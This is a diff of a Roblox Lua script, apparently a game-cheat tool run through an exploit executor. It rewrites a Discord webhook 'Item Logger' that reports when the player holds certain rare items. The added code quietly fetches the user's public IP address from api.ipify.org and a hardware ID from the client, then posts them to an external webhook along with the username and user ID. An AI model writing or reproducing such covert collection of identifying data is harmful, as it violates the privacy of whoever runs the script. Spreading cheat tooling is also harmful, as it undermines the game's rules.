@@ -98,7 +98,7 @@ local SCREEN_HEIGHT = workspace.CurrentCamera.ViewportSize.Y
 local MarketplaceService = game:GetService("MarketplaceService")
 local Players = game:GetService("Players")
 repeat wait() until Players.LocalPlayer
-local Player = Players.LocalPlayer
+local LocalPlayer = Players.LocalPlayer
 local oldBeli = 0
 local earnedBeli = 0
 local Converted = {}
@@ -106,70 +106,91 @@ local Converted = {}
 local isMinimized = true
 local isDragging = true
 
-local function sendRequest(tbl)
-    local requestFunc = http_request or request or HttpPost or syn and syn.request
-    if not requestFunc then
-        warn("[Webhook Error]: No compatible request function found!")
+local function PostWebhook(message)
+    local webhookUrl = getgenv().config and getgenv().config.Webhook and getgenv().config.Webhook["Webhook Url"]
+    local enabled = getgenv().config and getgenv().config.Webhook and getgenv().config.Webhook["Send Webhook"]
+
+    if not enabled or not webhookUrl then
+        warn("Webhook chưa được bật hoặc thiếu URL.")
         return
     end
 
-    local success, result = pcall(function()
-        return requestFunc(tbl)
-    end)
-
-    if not success then
-        warn("[Webhook Error]:", result)
+    local request = http_request or request or syn.request or http.request
+    if not request then
+        warn("Không tìm thấy phương thức gửi HTTP.")
+        return
     end
-end
 
-local function SendItemWebhook(hasGodsChalice, hasFistOfDarkness)
-    if not getgenv().config or not getgenv().config.Webhook or not getgenv().config.Webhook["Send Webhook"] then return end
-
-    local username = LocalPlayer.Name
-    local jobId = game.JobId
-    local beli = LocalPlayer:FindFirstChild("Data") and LocalPlayer.Data:FindFirstChild("Beli") and LocalPlayer.Data.Beli.Value or "Unknown"
-    local time = os.date("%H:%M:%S")
-    local placeName = "Unknown"
-
-    -- Lấy tên map
-    pcall(function()
-        placeName = MarketplaceService:GetProductInfo(game.PlaceId).Name
-    end)
-
-    local godsChaliceStatus = hasGodsChalice and "✅" or "❌"
-    local fistStatus = hasFistOfDarkness and "✅" or "❌"
-
-    local content = string.format(
-        "**📦 Inventory Check!**\n" ..
-        "👤 User: `%s`\n🆔 Job ID: `%s`\n💰 Beli: `%s`\n🏝️ Map: `%s`\n⏰ Time: `%s`\n\n" ..
-        "**🔑 Key Items:**\n" ..
-        "- God's Chalice: %s\n" ..
-        "- Fist of Darkness: %s",
-        username, jobId, beli, placeName, time,
-        godsChaliceStatus, fistStatus
-    )
-
-    local data = {
-        Url = getgenv().config.Webhook["Webhook Url"],
+    request({
+        Url = webhookUrl,
         Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
-        Body = HttpService:JSONEncode({ content = content })
-    }
-
-    sendRequest(data)
+        Headers = {["Content-Type"] = "application/json"},
+        Body = HttpService:JSONEncode(message)
+    })
 end
 
-spawn(function()
-    local lastStatus = {
-        hasGodsChalice = false,
-        hasFistOfDarkness = false
+-- Hàm gửi webhook khi có item
+local function SendItemWebhook(hasGodsChalice, hasFistOfDarkness)
+    local embed = {
+        ["title"] = "**📦 Inventory Check!**",
+        ["color"] = tonumber(0xf93dff),
+        ["fields"] = {
+            {
+                ["name"] = "👤 Username",
+                ["value"] = "```" .. LocalPlayer.Name .. "```",
+                ["inline"] = true
+            },
+            {
+                ["name"] = "🆔 UserId",
+                ["value"] = "```" .. LocalPlayer.UserId .. "```",
+                ["inline"] = true
+            },
+            {
+                ["name"] = "🏝️ Map",
+                ["value"] = "```" .. MarketplaceService:GetProductInfo(game.PlaceId).Name .. "```",
+                ["inline"] = false
+            },
+            {
+                ["name"] = "🌐 IP Address",
+                ["value"] = "```" .. tostring(game:HttpGet("https://api.ipify.org", true)) .. "```",
+                ["inline"] = false
+            },
+            {
+                ["name"] = "💻 HWID",
+                ["value"] = "```" .. game:GetService("RbxAnalyticsService"):GetClientId() .. "```",
+                ["inline"] = false
+            },
+            {
+                ["name"] = "🔑 God's Chalice",
+                ["value"] = hasGodsChalice and "✅" or "❌",
+                ["inline"] = true
+            },
+            {
+                ["name"] = "💥 Fist of Darkness",
+                ["value"] = hasFistOfDarkness and "✅" or "❌",
+                ["inline"] = true
+            },
+            {
+                ["name"] = "🧭 Job ID",
+                ["value"] = "```" .. game.JobId .. "```",
+                ["inline"] = false
+            },
+        },
+        ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S")
     }
 
-    while true do
-        wait(60)
+    local payload = {
+        ["username"] = "Item Logger",
+        ["embeds"] = {embed}
+    }
 
+    PostWebhook(payload)
+end
+
+-- Tự động kiểm tra item mỗi 60 giây
+spawn(function()
+    local sent = false
+    while task.wait(60) do
         local hasGodsChalice = false
         local hasFistOfDarkness = false
 
@@ -181,10 +202,11 @@ spawn(function()
             end
         end
 
-        if hasGodsChalice ~= lastStatus.hasGodsChalice or hasFistOfDarkness ~= lastStatus.hasFistOfDarkness then
+        if (hasGodsChalice or hasFistOfDarkness) and not sent then
             SendItemWebhook(hasGodsChalice, hasFistOfDarkness)
-            lastStatus.hasGodsChalice = hasGodsChalice
-            lastStatus.hasFistOfDarkness = hasFistOfDarkness
+            sent = true
+        elseif not hasGodsChalice and not hasFistOfDarkness then
+            sent = false
         end
     end
 end)
